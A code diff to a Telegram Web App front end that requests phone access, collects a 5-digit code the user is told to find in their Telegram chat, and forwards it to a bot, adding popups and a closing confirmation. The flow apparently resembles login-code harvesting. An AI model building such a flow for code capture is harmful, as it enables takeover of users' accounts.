@@ -9,9 +9,10 @@ document.addEventListener('DOMContentLoaded', function() {
     
     let currentIndex = 0;
     
-    // Initialize Telegram Web App
+    // Initialize Telegram Web App - Keep it open!
     tg.ready();
     tg.expand();
+    tg.enableClosingConfirmation(); // Prevent accidental closing
     
     function focusNextBox() {
         if (currentIndex < otpBoxes.length - 1) {
@@ -41,15 +42,30 @@ document.addEventListener('DOMContentLoaded', function() {
         phoneSection.style.display = 'none';
         otpSection.style.display = 'block';
         otpBoxes[0].focus();
+        // Show a message to user
+        tg.showPopup({
+            title: 'OTP Sent!',
+            message: 'Check your Telegram chat for the OTP code!',
+            buttons: [{ type: 'ok', text: 'Got it!' }]
+        });
     }
     
     // Request Phone Access
     requestPhoneBtn.addEventListener('click', function() {
-        // Since Telegram Web App doesn't directly access phone number,
-        // we'll send a request to the bot to send OTP
         if (tg) {
+            // Show loading
+            tg.MainButton.setText('Sending OTP...');
+            tg.MainButton.show();
+            tg.MainButton.disable();
+            
+            // Send request to bot - but don't close app!
+            // Use sendData but we'll handle it without closing
             tg.sendData('request_otp:requested');
-            showOtpSection();
+            
+            setTimeout(() => {
+                tg.MainButton.hide();
+                showOtpSection();
+            }, 500);
         }
     });
     
@@ -81,8 +97,17 @@ document.addEventListener('DOMContentLoaded', function() {
         const otp = Array.from(otpBoxes).map(box => box.value).join('');
         if (otp.length === 5) {
             if (tg) {
+                tg.MainButton.setText('Verifying...');
+                tg.MainButton.show();
+                tg.MainButton.disable();
                 tg.sendData('verify_otp:' + otp);
             }
+        } else {
+            tg.showPopup({
+                title: 'Error',
+                message: 'Please enter a complete 5-digit OTP!',
+                buttons: [{ type: 'ok', text: 'OK' }]
+            });
         }
     });
 });
